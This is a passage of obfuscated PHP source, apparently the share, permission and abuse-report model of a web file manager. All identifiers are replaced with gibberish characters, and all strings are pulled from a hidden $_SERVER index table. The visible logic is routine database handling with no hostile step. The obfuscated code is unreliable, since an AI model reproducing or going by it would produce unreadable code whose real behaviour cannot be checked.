$ôˆ‘ã˜¼[$Ò§æÖÒÚ]; } $â“ù™ûñ = $this->add($İÂúñåÇ); $Ä‹ëûÖû = array($‘Ÿé âŸ[2147] => short_id($â“ù™ûñ)); if ($this->where($Ä‹ëûÖû)->find()) { $Ä‹ëûÖû[$‘Ÿé âŸ[2147]] .= $‘Ÿé âŸ[464] . rand_string(2, 3); } $this->where(array($‘Ÿé âŸ[2168] => $â“ù™ûñ))->save($Ä‹ëûÖû); return $â“ù™ûñ; } private function _shareAuthSet($åÒ‚¿Æ‚, $¾ãïùÙ) { $¾çÃÄ” =& $_SERVER[ùèÅ´Ãš]; if (!is_array($¾ãïùÙ)) { return !1; } $¼êÊ‰ûù = Model($¾çÃÄ”[2110]); $¼êÊ‰ûù->where(array($¾çÃÄ”[672] => $åÒ‚¿Æ‚))->delete(); $ÚÑæõÛÆ = array(); foreach ($¾ãïùÙ as $¤ü¥®ú) { $–à–æ½ = SourceModel::TYPE_USER; if ($¤ü¥®ú[$¾çÃÄ”[191]] == SourceModel::TYPE_GROUP) { $–à–æ½ = SourceModel::TYPE_GROUP; } $»¤ÇÖ— = array($¾çÃÄ”[672] => $åÒ‚¿Æ‚, $¾çÃÄ”[191] => $–à–æ½, $¾çÃÄ”[573] => intval($¤ü¥®ú[$¾çÃÄ”[573]]), $¾çÃÄ”[2106] => 0, $¾çÃÄ”[2169] => -1); if ($¤ü¥®ú[$¾çÃÄ”[2106]]) { $»¤ÇÖ—[$¾çÃÄ”[2106]] = $¤ü¥®ú[$¾çÃÄ”[2106]]; } else { if ($¤ü¥®ú[$¾çÃÄ”[2169]]) { $»¤ÇÖ—[$¾çÃÄ”[2169]] = $¤ü¥®ú[$¾çÃÄ”[2169]]; } } $ÚÑæõÛÆ[] = $»¤ÇÖ—; } return $¼êÊ‰ûù->addAll($ÚÑæõÛÆ, array(), !0); } public function numViewAdd($ı†ÛÙöô) { $šÙ¡ÑÃ· =& $_SERVER[ùèÅ´Ãš]; $š£Š°ğ„ = array($šÙ¡ÑÃ·[2168] => $ı†ÛÙöô); $this->where($š£Š°ğ„)->setAdd($šÙ¡ÑÃ·[2164]); } public function numDownloadAdd($ˆõøÃõ) { $âÆËÖ¡ï =& $_SERVER[ùèÅ´Ãš]; $·ÀÙ˜Ñè = array($âÆËÖ¡ï[2168] => $ˆõøÃõ); $this->where($·ÀÙ˜Ñè)->setAdd($âÆËÖ¡ï[2165]); } protected function shareEdit($Ü×…ë, $Ä³ïèñ ) { $¤ª¥à” =& $_SERVER[ùèÅ´Ãš]; $Ş©Ü–Ë = $this->getInfo($Ü×…ë); if (!$Ş©Ü–Ë) { return !1; } if ($Ä³ïèñ [$¤ª¥à”[2147]] && $Ä³ïèñ [$¤ª¥à”[566]] == $¤ª¥à”[91]) { if ($Ä³ïèñ [$¤ª¥à”[2147]] == $Ş©Ü–Ë[$¤ª¥à”[2147]]) { unset($Ä³ïèñ [$¤ª¥à”[2147]]); } if ($Ä³ïèñ [$¤ª¥à”[2147]]) { $ïğ–Å£¨ = $this->where(array($¤ª¥à”[2170] => $Ä³ïèñ [$¤ª¥à”[2147]]))->find(); if ($ïğ–Å£¨) { return !1; } if (!is_array($Ä³ïèñ [$¤ª¥à”[2166]])) { $Ä³ïèñ [$¤ª¥à”[2166]] = array(); } if (!$Ä³ïèñ [$¤ª¥à”[2166]][$¤ª¥à”[2171]]) { $Ä³ïèñ [$¤ª¥à”[2166]][$¤ª¥à”[2171]] = $Ş©Ü–Ë[$¤ª¥à”[2147]]; $Ä³ïèñ [$¤ª¥à”[2166]][$¤ª¥à”[2172]] = $¤ª¥à”[91]; } } } $this->_checkLinkShare($Ä³ïèñ , $Ş©Ü–Ë); $ğ°´îÀÇ = array(); $¬ıëİª = explode($¤ª¥à”[50], $¤ª¥à”[2173]); foreach ($¬ıëİª as $·¯Î×µ) { if (!array_key_exists($·¯Î×µ, $Ä³ïèñ )) { continue; } $ğ°´îÀÇ[$·¯Î×µ] = $Ä³ïèñ [$·¯Î×µ]; } $this->shareEventAdd($Ş©Ü–Ë[$¤ª¥à”[194]], $Ä³ïèñ , $¤ª¥à”[1967]); $this->where(array($¤ª¥à”[2168] => $Ü×…ë))->save($ğ°´îÀÇ); if (isset($Ä³ïèñ [$¤ª¥à”[2156]])) { $this->_shareAuthSet($Ü×…ë, $Ä³ïèñ [$¤ª¥à”[2156]]); } return !0; } private function _checkLinkShare($®¨¸‹´Â, $Öøùù) { $£…†¨“ =& $_SERVER[ùèÅ´Ãš]; if ($®¨¸‹´Â[$£…†¨“[566]] != $£…†¨“[91]) { return; } $‘€€ÁõÖ = $Öøùù[$£…†¨“[90]][$£…†¨“[194]]; if ($Öøùù[$£…†¨“[90]][$£…†¨“[33]] != $£…†¨“[233]) { $§õØ„³ = $this->_folderReport($‘€€ÁõÖ); if (!$§õØ„³) { return; } show_json(LNG($£…†¨“[2174]) . $£…†¨“[2175] . $§õØ„³, !1); } $Å—Å–É  = Model($£…†¨“[908])->fileInfoGet($Öøùù[$£…†¨“[90]][$£…†¨“[194]]); if (!$Å—Å–É ) { return; } $³áí‹ºŒ = $this->shareFileMeta($Å—Å–É [$£…†¨“[545]]); if (isset($³áí‹ºŒ[$£…†¨“[452]]) && $³áí‹ºŒ[$£…†¨“[452]] == $£…†¨“[91]) { show_json(LNG($£…†¨“[2176]), !1); } } private function _folderReport($éÎªĞš) { $òµÙ›×¬ =& $_SERVER[ùèÅ´Ãš]; $Ê¸í¡§š = array($òµÙ›×¬[545] => array($òµÙ›×¬[1100], 0), $òµÙ›×¬[827] => 3); $Ÿğ¼ÆÕŒ = Model($òµÙ›×¬[2177])->where($Ê¸í¡§š)->field($òµÙ›×¬[545])->select(); if (!$Ÿğ¼ÆÕŒ) { return !1; } $Ÿğ¼ÆÕŒ = array_to_keyvalue($Ÿğ¼ÆÕŒ, $òµÙ›×¬[12], $òµÙ›×¬[545]); $·³·¶‰ = $òµÙ›×¬[50] . $éÎªĞš . $òµÙ›×¬[50]; $Ê¸í¡§š = array($òµÙ›×¬[545] => array($òµÙ›×¬[7], $Ÿğ¼ÆÕŒ), $òµÙ›×¬[588] => array($òµÙ›×¬[461], "\45{$·³·¶‰}\45"), $òµÙ›×¬[507] => 0); $Ù¬ˆƒ•Ã = Model($òµÙ›×¬[908])->where($Ê¸í¡§š)->field($òµÙ›×¬[2178])->find(); if (!$Ù¬ˆƒ•Ã) { return !1; } $ßÈÕİã = substr($Ù¬ˆƒ•Ã[$òµÙ›×¬[588]], strpos($Ù¬ˆƒ•Ã[$òµÙ›×¬[588]], $·³·¶‰)); $Ê¸í¡§š = array($òµÙ›×¬[194] => array($òµÙ›×¬[7], trim($ßÈÕİã, $òµÙ›×¬[50]))); $÷çèÌä– = Model($òµÙ›×¬[908])->where($Ê¸í¡§š)->field($òµÙ›×¬[32])->select(); $°¿ó¸Ë = array_to_keyvalue($÷çèÌä–, $òµÙ›×¬[12], $òµÙ›×¬[32]); $°¿ó¸Ë[] = $Ù¬ˆƒ•Ã[$òµÙ›×¬[32]]; return implode($òµÙ›×¬[8], $°¿ó¸Ë); } protected function remove($Æ¸ì°¶) { $ã€Œ“–‘ =& $_SERVER[ùèÅ´Ãš]; $«§ÅûÕ² = is_array($Æ¸ì°¶) ? $Æ¸ì°¶ : array($Æ¸ì°¶); for ($óå•Õùñ = 0; $óå•Õùñ < count($«§ÅûÕ²); $óå•Õùñ++) { $ÉŠôÔ¾° = $this->getInfo($«§ÅûÕ²[$óå•Õùñ]); if ($ÉŠôÔ¾°[$ã€Œ“–‘[670]] == $ã€Œ“–‘[91]) { Model($ã€Œ“–‘[640])->eventShare($ÉŠôÔ¾°[$ã€Œ“–‘[194]], $ã€Œ“–‘[2162]); } if ($ÉŠôÔ¾°[$ã€Œ“–‘[566]] == $ã€Œ“–‘[91]) { Model($ã€Œ“–‘[640])->eventShare($ÉŠôÔ¾°[$ã€Œ“–‘[194]], $ã€Œ“–‘[2161]); } $this->shareInfoMofify($ÉŠôÔ¾°, $ã€Œ“–‘[2146]); } $¶¬Ñ¾ÙÀ = array($ã€Œ“–‘[672] => array($ã€Œ“–‘[7], $«§ÅûÕ²)); $»ÖØŠçç = $this->where($¶¬Ñ¾ÙÀ)->delete(); if ($»ÖØŠçç) { Model($ã€Œ“–‘[673])->where($¶¬Ñ¾ÙÀ)->delete(); } return $»ÖØŠçç; } protected function removeBySource($’«ä®©¯) { $ç×®›ş„ =& $_SERVER[ùèÅ´Ãš]; $¡Ğ¼Êî = array($ç×®›ş„[493] => array($ç×®›ş„[494], $’«ä®©¯)); $¹®Œ£Åš = $this->field($ç×®›ş„[672])->where($¡Ğ¼Êî)->select(); $ˆ²×æ›‘ = array_to_keyvalue($¹®Œ£Åš, $ç×®›ş„[12], $ç×®›ş„[672]); if (!$ˆ²×æ›‘) { return; } foreach ($¹®Œ£Åš as $µºÄÈÏ) { $this->shareInfoMofify($µºÄÈÏ, $ç×®›ş„[2146]); } $¡Ğ¼Êî = array($ç×®›ş„[2168] => array($ç×®›ş„[494], $ˆ²×æ›‘)); $this->where($¡Ğ¼Êî)->delete(); Model($ç×®›ş„[673])->where($¡Ğ¼Êî)->delete(); } public function listAll($ççº§ïè) { $ÕÑéÏ¢‘ =& $_SERVER[ùèÅ´Ãš]; $¡õ†éß = array(); if ($ççº§ïè[$ÕÑéÏ¢‘[1797]]) { $¡õ†éß[$ÕÑéÏ¢‘[1797]] = $ççº§ïè[$ÕÑéÏ¢‘[1797]]; } if ($ççº§ïè[$ÕÑéÏ¢‘[838]]) { $ˆ‘°öÜ = $ççº§ïè[$ÕÑéÏ¢‘[839]] ? $ççº§ïè[$ÕÑéÏ¢‘[839]] : strtotime(date($ÕÑéÏ¢‘[2179])); $¡õ†éß[$ÕÑéÏ¢‘[234]] = array($ÕÑéÏ¢‘[410], array($ççº§ïè[$ÕÑéÏ¢‘[838]], $ˆ‘°öÜ)); } if ($ççº§ïè[$ÕÑéÏ¢‘[33]]) { $¡õ†éß[$ççº§ïè[$ÕÑéÏ¢‘[33]]] = 1; } else { $¡õ†éß[] = array($ÕÑéÏ¢‘[566] => array($ÕÑéÏ¢‘[1100], 0), $ÕÑéÏ¢‘[670] => array($ÕÑéÏ¢‘[1100], 0), $ÕÑéÏ¢‘[2150] => $ÕÑéÏ¢‘[2100]); } if ($ççº§ïè[$ÕÑéÏ¢‘[2096]]) { $¡õ†éß[] = array($ÕÑéÏ¢‘[2147] => $ççº§ïè[$ÕÑéÏ¢‘[2096]], $ÕÑéÏ¢‘[1683] => array($ÕÑéÏ¢‘[461], "\45{$ççº§ïè[$ÕÑéÏ¢‘[2096]]}\45"), $ÕÑéÏ¢‘[2150] => $ÕÑéÏ¢‘[2100]); } $ÙøÅßüã = $this->_makeOrder()->where($¡õ†éß)->selectPage(20); if (empty($ÙøÅßüã[$ÕÑéÏ¢‘[447]])) { return array(); } $this->_listDataApply($ÙøÅßüã[$ÕÑéÏ¢‘[447]]); return $ÙøÅßüã; } public function listDataApply($øÄøÙ·Á) { $this->_listDataApply($øÄøÙ·Á); return $øÄøÙ·Á; } private function _listDataApply(&$Š¤ıÀŒ) { $¬²¡õá =& $_SERVER[ùèÅ´Ãš]; $Î·Í†‚ = array_to_keyvalue($Š¤ıÀŒ, $¬²¡õá[12], $¬²¡õá[1797]); $€Ô†¤ù = Model($¬²¡õá[601])->userListInfo(array_unique($Î·Í†‚)); $Â’™Èäµ = array_to_keyvalue($Š¤ıÀŒ, $¬²¡õá[12], $¬²¡õá[194]); $ß­§» = Model($¬²¡õá[908])->sourceListInfo($Â’™Èäµ, !0); foreach ($Š¤ıÀŒ as $õÅŒ£á => &$È­‚ü” ) { $şíƒ–ÕÌ = $È­‚ü” [$¬²¡õá[1797]]; $È­‚ü” [$¬²¡õá[2180]] = $€Ô†¤ù[$şíƒ–ÕÌ] ? $€Ô†¤ù[$şíƒ–ÕÌ] : !1; if (!$È­‚ü” [$¬²¡õá[2180]] || $È­‚ü” [$¬²¡õá[2180]][$¬²¡õá[827]] != $¬²¡õá[91]) { unset($Š¤ıÀŒ[$õÅŒ£á]); continue; } $º‰ÄÊÄ = $È­‚ü” [$¬²¡õá[194]]; $È­‚ü” [$¬²¡õá[90]] = $ß­§»[$º‰ÄÊÄ] ? $ß­§»[$º‰ÄÊÄ] : !1; if ($È­‚ü” [$¬²¡õá[90]][$¬²¡õá[507]] == $¬²¡õá[91]) { unset($Š¤ıÀŒ[$õÅŒ£á]); } if ($È­‚ü” [$¬²¡õá[90]] != $¬²¡õá[231] && !$È­‚ü” [$¬²¡õá[90]]) { unset($Š¤ıÀŒ[$õÅŒ£á]); } } unset($È­‚ü” ); $Š¤ıÀŒ = array_values($Š¤ıÀŒ); } private function _makeOrder($ı½Ğ¨ÄÑ = '') { $Æ¬âÕŒ =& $_SERVER[ùèÅ´Ãš]; $ñğ¢ÛÚñ = array($Æ¬âÕŒ[234], $Æ¬âÕŒ[839], $Æ¬âÕŒ[2164], $Æ¬âÕŒ[2165]); $¶×ÛìÄ = array($Æ¬âÕŒ[525] => $Æ¬âÕŒ[526], $Æ¬âÕŒ[527] => $Æ¬âÕŒ[528]); $Õ—‹şéÄ = Input::get($Æ¬âÕŒ[532], $Æ¬âÕŒ[7], $Æ¬âÕŒ[499], $ñğ¢ÛÚñ); $óÅ”â·Ô = Input::get($Æ¬âÕŒ[533], $Æ¬âÕŒ[7], $Æ¬âÕŒ[2181], array($Æ¬âÕŒ[2093], $Æ¬âÕŒ[527])); $óÅ”â·Ô = $¶×ÛìÄ[$óÅ”â·Ô]; $ı½Ğ¨ÄÑ = $ı½Ğ¨ÄÑ . "{$Õ—‹şéÄ}\x20{$óÅ”â·Ô}"; return $this->order($ı½Ğ¨ÄÑ); } public function reportAdd($áêµÖù’) { $àğÎ‹ê” =& $_SERVER[ùèÅ´Ãš]; $Å”íşø = array($àğÎ‹ê”[672] => $áêµÖù’[$àğÎ‹ê”[672]], $àğÎ‹ê”[1797] => USER_ID); if (Model($àğÎ‹ê”[2177])->where($Å”íşø)->find()) { return !1; } $†»˜Â = array($àğÎ‹ê”[672] => $áêµÖù’[$àğÎ‹ê”[672]], $àğÎ‹ê”[1683] => $áêµÖù’[$àğÎ‹ê”[1683]], $àğÎ‹ê”[194] => $áêµÖù’[$àğÎ‹ê”[194]], $àğÎ‹ê”[545] => $áêµÖù’[$àğÎ‹ê”[545]], $àğÎ‹ê”[1797] => USER_ID, $àğÎ‹ê”[33] => $áêµÖù’[$àğÎ‹ê”[33]], $àğÎ‹ê”[528] => $áêµÖù’[$àğÎ‹ê”[528]]); return Model($àğÎ‹ê”[2177])->add($†»˜Â); } public function reportList($†éñõŠ) { $˜ÓŸÁŸ =& $_SERVER[ùèÅ´Ãš]; $Ş¿ë»š› = array(); if ($†éñõŠ[$˜ÓŸÁŸ[838]]) { $ñ“åµıä = $†éñõŠ[$˜ÓŸÁŸ[839]] ? $†éñõŠ[$˜ÓŸÁŸ[839]] : strtotime(date($˜ÓŸÁŸ[2179])); $Ş¿ë»š›[$˜ÓŸÁŸ[234]] = array($˜ÓŸÁŸ[410], array($†éñõŠ[$˜ÓŸÁŸ[838]], $ñ“åµıä)); } if (isset($†éñõŠ[$˜ÓŸÁŸ[33]]) && in_array($†éñõŠ[$˜ÓŸÁŸ[33]], array($˜ÓŸÁŸ[91], $˜ÓŸÁŸ[512], $˜ÓŸÁŸ[2182], $˜ÓŸÁŸ[2183], $˜ÓŸÁŸ[2184]))) { $Ş¿ë»š›[$˜ÓŸÁŸ[33]] = $†éñõŠ[$˜ÓŸÁŸ[33]]; } if (isset($†éñõŠ[$˜ÓŸÁŸ[827]]) && in_array($†éñõŠ[$˜ÓŸÁŸ[827]], array($˜ÓŸÁŸ[231], $˜ÓŸÁŸ[91], $˜ÓŸÁŸ[512], $˜ÓŸÁŸ[2182]))) { $Ş¿ë»š›[$˜ÓŸÁŸ[827]] = $†éñõŠ[$˜ÓŸÁŸ[827]]; } $‚Œ…ÑŞ = Input::get($˜ÓŸÁŸ[533], $˜ÓŸÁŸ[7], $˜ÓŸÁŸ[2181], array($˜ÓŸÁŸ[2093], $˜ÓŸÁŸ[527])); $ñõ§°Ğ— = array($˜ÓŸÁŸ[525] => $˜ÓŸÁŸ[526], $˜ÓŸÁŸ[527] => $˜ÓŸÁŸ[528]); $…¬ŠöàÂ = $˜ÓŸÁŸ[2185] . $ñõ§°Ğ—[$‚Œ…ÑŞ]; $°Î€‡á = Model($˜ÓŸÁŸ[2177])->where($Ş¿ë»š›)->order($…¬ŠöàÂ)->selectPage(20); if (empty($°Î€‡á[$˜ÓŸÁŸ[447]])) { return array(); } $ù¯Şİ¢˜ = array_to_keyvalue_group($°Î€‡á[$˜ÓŸÁŸ[447]], $˜ÓŸÁŸ[827], $˜ÓŸÁŸ[672]); if (!empty($ù¯Şİ¢˜[0])) { $†éñõŠ = $ù¯Şİ¢˜[0]; $Ş¿ë»š› = array($˜ÓŸÁŸ[672] => array($˜ÓŸÁŸ[7], $†éñõŠ)); $¶ ÕøÇ = $this->where($Ş¿ë»š›)->field($˜ÓŸÁŸ[672])->select(); $¶ ÕøÇ = array_to_keyvalue($¶ ÕøÇ, $˜ÓŸÁŸ[12], $˜ÓŸÁŸ[672]); $°¯¤İîÁ = array_diff($†éñõŠ, $¶ ÕøÇ); if (!empty($°¯¤İîÁ)) { foreach ($°Î€‡á[$˜ÓŸÁŸ[447]] as $¼ñå½Òñ => $òö×â¤ñ) { if (in_array($òö×â¤ñ[$˜ÓŸÁŸ[672]], $°¯¤İîÁ)) { unset($°Î€‡á[$˜ÓŸÁŸ[447]][$¼ñå½Òñ]); } } } } $this->_listDataApply($°Î€‡á[$˜ÓŸÁŸ[447]]); return $°Î€‡á; } public function reportStatus($ÏÈèã¡Ÿ) { $×ºŸÀÄÒ =& $_SERVER[ùèÅ´Ãš]; $œ«ˆËò° = array($×ºŸÀÄÒ[477] => $ÏÈèã¡Ÿ[$×ºŸÀÄÒ[477]]); $¥Æ‚—Áõ = Model($×ºŸÀÄÒ[2177])->where($œ«ˆËò°)->field($×ºŸÀÄÒ[2186])->find(); if (!$¥Æ‚—Áõ) { return !1; } $¼ò¿ğËŞ = array($×ºŸÀÄÒ[827] => $ÏÈèã¡Ÿ[$×ºŸÀÄÒ[827]]); if ($ÏÈèã¡Ÿ[$×ºŸÀÄÒ[827]] == $×ºŸÀÄÒ[2182] && $¥Æ‚—Áõ[$×ºŸÀÄÒ[827]] == $×ºŸÀÄÒ[2182]) { $¼ò¿ğËŞ[$×ºŸÀÄÒ[827]] = 0; } $ŞÕ˜²ˆ’ = Model($×ºŸÀÄÒ[2177])->where($œ«ˆËò°)->save($¼ò¿ğËŞ); if ($ÏÈèã¡Ÿ[$×ºŸÀÄÒ[827]] == $×ºŸÀÄÒ[512]) { if ($¥Æ‚—Áõ[$×ºŸÀÄÒ[545]] != $×ºŸÀÄÒ[231] && $this->shareFileMeta($¥Æ‚—Áõ[$×ºŸÀÄÒ[545]])) { $this->shareFileMeta($¥Æ‚—Áõ[$×ºŸÀÄÒ[545]], 0); } $this->remove($¥Æ‚—Áõ[$×ºŸÀÄÒ[672]]); return !0; } if ($ŞÕ˜²ˆ’ && $ÏÈèã¡Ÿ[$×ºŸÀÄÒ[827]] == $×ºŸÀÄÒ[2182]) { $û£‚©ˆÎ = $¼ò¿ğËŞ[$×ºŸÀÄÒ[827]] == $×ºŸÀÄÒ[2182] ? 1 : 0; $this->shareFileMeta($¥Æ‚—Áõ[$×ºŸÀÄÒ[545]], $û£‚©ˆÎ); $this->removeByFile($¥Æ‚—Áõ[$×ºŸÀÄÒ[545]]); } return $ŞÕ˜²ˆ’; } private function removeByFile($õœı‡¤Â) { $ñ›ÂÛ‡Ô =& $_SERVER[ùèÅ´Ãš]; $˜²İøëö = Model($ñ›ÂÛ‡Ô[908])->where(array($ñ›ÂÛ‡Ô[545] => $õœı‡¤Â))->field($ñ›ÂÛ‡Ô[194])->select(); $å‘ÃÊ˜“ = array_to_keyvalue($˜²İøëö, $ñ›ÂÛ‡Ô[12], $ñ›ÂÛ‡Ô[194]); $™éÉ¸Š = array($ñ›ÂÛ‡Ô[194] => array($ñ›ÂÛ‡Ô[7], $å‘ÃÊ˜“), $ñ›ÂÛ‡Ô[566] => 1); $˜²İøëö = $this->where($™éÉ¸Š)->field($ñ›ÂÛ‡Ô[672])->select(); if (empty($˜²İøëö)) { return; } $–®«ÈÔ = array_to_keyvalue($˜²İøëö, $ñ›ÂÛ‡Ô[12], $ñ›ÂÛ‡Ô[672]); $this->remove($–®«ÈÔ); } private function shareFileMeta($¾ ”à”, $ Ù×‘¨È = null) { $‘‡ì¶¬ =& $_SERVER[ùèÅ´Ãš]; $öäç»Ïî = array($‘‡ì¶¬[545] => $¾ ”à”, $‘‡ì¶¬[97] => $‘‡ì¶¬[2187]); if (is_null($ Ù×‘¨È)) { return Model($‘‡ì¶¬[2188])->where($öäç»Ïî)->find(); } $öäç»Ïî[$‘‡ì¶¬[452]] = $ Ù×‘¨È; Model($‘‡ì¶¬[2188])->add($öäç»Ïî, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\145\x5f\141\x75\164\150"; public function getAuth($¼œìÃî) { $áğâË‡Ô =& $_SERVER[ùèÅ´Ãš]; $ÁÜ¸ÒÉ¼ = $this->sourceAuthSelect($¼œìÃî); $–èñÌÊ´ = array(); $Í¤î€™Ü = array(); $­÷‰‘ÄÄ = 2 << 25; foreach ($ÁÜ¸ÒÉ¼ as $ïËÀËá) { $•ùÆû­ = Model($áğâË‡Ô[575])->listData($ïËÀËá[$áğâË‡Ô[2106]]); if (!$•ùÆû­) { continue; } $–èñÌÊ´[] = $ïËÀËá; $ïöÊ’í€ = 0; if ($ïËÀËá[$áğâË‡Ô[191]] == SourceModel::TYPE_GROUP) { $ïöÊ’í€ = $­÷‰‘ÄÄ * 2; } if ($ïËÀËá[$áğâË‡Ô[191]] == SourceModel::TYPE_USER) { $ïöÊ’í€ = $­÷‰‘ÄÄ; } if ($ïËÀËá[$áğâË‡Ô[191]] == SourceModel::TYPE_USER && $ïËÀËá[$áğâË‡Ô[573]] == $áğâË‡Ô[231]) { $ïöÊ’í€ = 0; } $Í¤î€™Ü[] = $•ùÆû­[$áğâË‡Ô[489]] + $ïöÊ’í€; } array_multisort($Í¤î€™Ü, SORT_DESC, $–èñÌÊ´); return $–èñÌÊ´; } public function sourceAuthSelect($ğÚø¿ï‰) { $º½ù‹· =& $_SERVER[ùèÅ´Ãš]; static $ÏÍîÕ€° = array(); $¯åÇáÊ­ = is_array($ğÚø¿ï‰) ? !1 : !0; if ($¯åÇáÊ­) { $ğÚø¿ï‰ = array($ğÚø¿ï‰); } $¸š—€ì— = array(); foreach ($ğÚø¿ï‰ as $îÀå„Òæ) { if (isset($ÏÍîÕ€°[$îÀå„Òæ])) { $¸š—€ì—[$îÀå„Òæ] = $ÏÍîÕ€°[$îÀå„Òæ]; } } if (count($¸š—€ì—) == count($ğÚø¿ï‰)) { return $¯åÇáÊ­ ? $¸š—€ì—[$ğÚø¿ï‰[0]] : $¸š—€ì—; } $¾ğÇ¿ = $º½ù‹·[2189]; $Äµ½ß•ş = array($º½ù‹·[194] => array($º½ù‹·[7], $ğÚø¿ï‰)); $ŞÀœ’´È = $this->field($¾ğÇ¿)->order($º½ù‹·[477])->where($Äµ½ß•ş)->select(); $­¾ŞùâÌ = array_to_keyvalue_group($ŞÀœ’´È, $º½ù‹·[194]); foreach ($ğÚø¿ï‰ as $îÀå„Òæ) { $ÏÍîÕ€°[$îÀå„Òæ] = $­¾ŞùâÌ[$îÀå„Òæ] ? $­¾ŞùâÌ[$îÀå„Òæ] : array(); } if ($¯åÇáÊ­) { return $ŞÀœ’´È; } return $­¾ŞùâÌ; } public function setAuth($éı…²Ú, $íŠÆäÌ) { $ÍÑÒß°† =& $_SERVER[ùèÅ´Ãš]; $ûù†ÙÃ„ = Model($ÍÑÒß°†[1442])->sourceInfo($éı…²Ú); if (!$ûù†ÙÃ„) { return !1; } if ($ûù†ÙÃ„[$ÍÑÒß°†[191]] != SourceModel::TYPE_GROUP) { return !1; } $€®»Àõë = 1; $¸óëì’ = $ûù†ÙÃ„[$ÍÑÒß°†[573]]; if ($¸óëì’ != $€®»Àõë) { $€Üúç”â = array($ÍÑÒß°†[1404] => $¸óëì’); $’†¾µ‘È = Model($ÍÑÒß°†[2092])->field($ÍÑÒß°†[1797])->where($€Üúç”â)->select(); $’†¾µ‘È = array_to_keyvalue($’†¾µ‘È, $ÍÑÒß°†[12], $ÍÑÒß°†[1797]); } $‹Ö©Ÿ¶Î = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ß×‹íŠö = array(); foreach ($íŠÆäÌ as $ÇôŸÇ„Š) { if (!in_array($ÇôŸÇ„Š[$ÍÑÒß°†[191]], $‹Ö©Ÿ¶Î)) { show_json(LNG($ÍÑÒß°†[2190]), !1); } if ($¸óëì’ != $€®»Àõë) { if ($ÇôŸÇ„Š[$ÍÑÒß°†[191]] == SourceModel::TYPE_GROUP) { } if ($ÇôŸÇ„Š[$ÍÑÒß°†[573]] != 0 && !in_array($ÇôŸÇ„Š[$ÍÑÒß°†[573]], $’†¾µ‘È)) { } } if ($ÇôŸÇ„Š[$ÍÑÒß°†[573]] == 0) { $ÇôŸÇ„Š[$ÍÑÒß°†[191]] = SourceModel::TYPE_USER; } $ß×‹íŠö[] = array($ÍÑÒß°†[194] => $éı…²Ú, $ÍÑÒß°†[191] => intval($ÇôŸÇ„Š[$ÍÑÒß°†[191]]), $ÍÑÒß°†[573] => intval($ÇôŸÇ„Š[$ÍÑÒß°†[573]]), $ÍÑÒß°†[2106] => intval($ÇôŸÇ„Š[$ÍÑÒß°†[2106]]) ? intval($ÇôŸÇ„Š[$ÍÑÒß°†[2106]]) : 0, $ÍÑÒß°†[2169] => intval($ÇôŸÇ„Š[$ÍÑÒß°†[2169]]) ? intval($ÇôŸÇ„Š[$ÍÑÒß°†[2169]]) : -1); } $this->where(array($ÍÑÒß°†[493] => $éı…²Ú))->delete(); $this->addAll($ß×‹íŠö); return !0; } public function authClear($Äª¬àÍ‹) { $Ì“©â»“ =& $_SERVER[ùèÅ´Ãš]; $æ”Æã¦£ = Model($Ì“©â»“[1442])->sourceInfo($Äª¬àÍ‹); $Äù†ÍÄ÷ = array($Äª¬àÍ‹); if ($æ”Æã¦£[$Ì“©â»“[487]] == $Ì“©â»“[91]) { $˜ä™³°ñ = array($Ì“©â»“[659] => array($Ì“©â»“[619], $æ”Æã¦£[$Ì“©â»“[588]] . $Äª¬àÍ‹ . $Ì“©â»“[620])); $Äù†ÍÄ÷ = Model($Ì“©â»“[1442])->field($Ì“©â»“[493])->where($˜ä™³°ñ)->getField($Ì“©â»“[194], !0); $Äù†ÍÄ÷[] = $Äª¬àÍ‹; } $this->where(array($Ì“©â»“[493] => array($Ì“©â»“[494], $Äù†ÍÄ÷)))->delete(); return !0; } public function getAllChildren($¼€˜İ·º) { $·›Ãšâ» =& $_SERVER[ùèÅ´Ãš]; $æ¨¾ñ™ù = Model($·›Ãšâ»[1442])->sourceInfo($¼€˜İ·º); if ($æ¨¾ñ™ù[$·›Ãšâ»[487]] != $·›Ãšâ»[91]) { return $this->sourceListAuth(array($¼€˜İ·º)); } if ($æ¨¾ñ™ù[$·›Ãšâ»[191]] != SourceModel::TYPE_GROUP) { return array(); } $Ù‰‡ùºõ = 1; $ßÖüËôæ = array($¼€˜İ·º); if ($æ¨¾ñ™ù[$·›Ãšâ»[193]] == $·›Ãšâ»[231] && $æ¨¾ñ™ù[$·›Ãšâ»[573]] != $Ù‰‡ùºõ) { $ßÖüËôæ = $this->groupChidldAllRootSource($æ¨¾ñ™ù[$·›Ãšâ»[573]]); } $şÒ¨Ş ñ = $this->field($·›Ãšâ»[194])->group($·›Ãšâ»[194])->select(); $şÒ¨Ş ñ = array_to_keyvalue($şÒ¨Ş ñ, $·›Ãšâ»[12], $·›Ãšâ»[194]); if (!$şÒ¨Ş ñ) { return array(); } $”ÂÊ¿ü§ = $·›Ãšâ»[2191]; $¢‚ÏÚ×» = array($·›Ãšâ»[194] => array($·›Ãšâ»[7], $şÒ¨Ş ñ), $·›Ãšâ»[507] => $·›Ãšâ»[231]); $û£ø¶‚‹ = Model($·›Ãšâ»[908])->field($”ÂÊ¿ü§)->where($¢‚ÏÚ×»)->select(); $ëŠµƒØŠ = array($¼€˜İ·º); foreach ($û£ø¶‚‹ as $üÇÉİÎÕ) { foreach ($ßÖüËôæ as $«Ï’Ñ°´) { $æÂà»ãè = $·›Ãšâ»[50] . $«Ï’Ñ°´ . $·›Ãšâ»[50]; $œ¿šË®Â = $üÇÉİÎÕ[$·›Ãšâ»[588]] . $üÇÉİÎÕ[$·›Ãšâ»[194]] . $·›Ãšâ»[50]; if (strstr($œ¿šË®Â, $æÂà»ãè)) { $ëŠµƒØŠ[] = $üÇÉİÎÕ[$·›Ãšâ»[194]]; break; } } } return $this->sourceListAuth($ëŠµƒØŠ); } private function sourceListAuth($‚Œ»äùÍ) { $ÎÈùıé« =& $_SERVER[ùèÅ´Ãš]; $ªÙì‘ì = Model($ÎÈùıé«[1442])->sourceListInfo($‚Œ»äùÍ, !0); $ ºÇç™ê = $this->sourceAuthSelect($‚Œ»äùÍ); $ÓáÓôöá = array(); $©İ¿µ¸¡ = array(); foreach ($ªÙì‘ì as $Éåîç ×) { unset($Éåîç ×[$ÎÈùıé«[531]]); unset($Éåîç ×[$ÎÈùıé«[529]]); unset($Éåîç ×[$ÎÈùıé«[489]]); unset($Éåîç ×[$ÎÈùıé«[90]]); $ãæÆú˜™ = $ 